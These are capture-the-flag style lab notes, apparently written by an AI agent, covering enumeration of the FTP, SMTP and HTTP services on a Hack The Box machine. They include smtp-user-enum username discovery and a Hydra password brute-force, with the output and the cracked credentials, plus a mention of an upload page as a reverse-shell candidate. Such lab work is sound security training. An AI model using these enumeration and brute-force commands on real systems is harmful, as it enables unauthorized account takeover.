# NOTES

## Port 80 Enumeration
There's [XAMPP](./port80_webapp.png) app on port 80.

Server header shows as: `Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29`

## Port 443 Enumeration

There's basic HTTP auth. Attempted `admin:admin` and it didn't work.

## Port 22 Enumeration

* Can connect but there's no anonymous. Tried the following
  * admin:admin (x)
  * anonymous:anonymous (x)
  * ftp:ftp (x)

## Port 25 Enumeration

Found 1 user. 

```bash
└─$ run smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D inlanefreight.htb -t 10.129.203.7
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Wed Apr 22 12:56:31 2026 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Wed Apr 22 13:31:22 2026 #########
1 results.

10713 queries in 2091 seconds (5.1 queries / sec)
📋 Logged: /home/openclaw/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data/cmd_20260422_125631.log
```

Was able to brute force the password as well.

```bash
# Hydra v9.6 run at 2026-04-22 13:50:53 on 10.129.203.7 smtp (hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 32 -o /tmp/hydra_fiona.txt smtp://10.129.203.7:587)
[587][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
```

## Port 22 with fiona credentials

`fiona:987654321` works. However, ftp server has passive mode and prevents getting access to data

```
└─$ lftp -u fiona,987654321 10.129.203.7
lftp fiona@10.129.203.7:~> ls
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (50:18:D8:D5:BA:6B:5A:1C:8D:F6:59:69:45:D7:FE:06:3D:32:7F:AD)
lftp fiona@10.129.203.7:~> set ftp:passive-mode on
lftp fiona@10.129.203.7:~> set ftp:extended-passive on
ftp:extended-passive: no such variable. Use `set -a' to look at all variables.
lftp fiona@10.129.203.7:~> set ssl:verify-certificate no
lftp fiona@10.129.203.7:~> ls
`ls' at 0 [Making data connection...]
```

## Port 443 with fiona creds

fiona:987654321 is valid for the HTTP basic auth. 

![](./port_443_fiona.png)

I provides page to upload to the FTP file server. Candidate for reverse shell. The WebServersInfo.txt had the following content:

```text
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```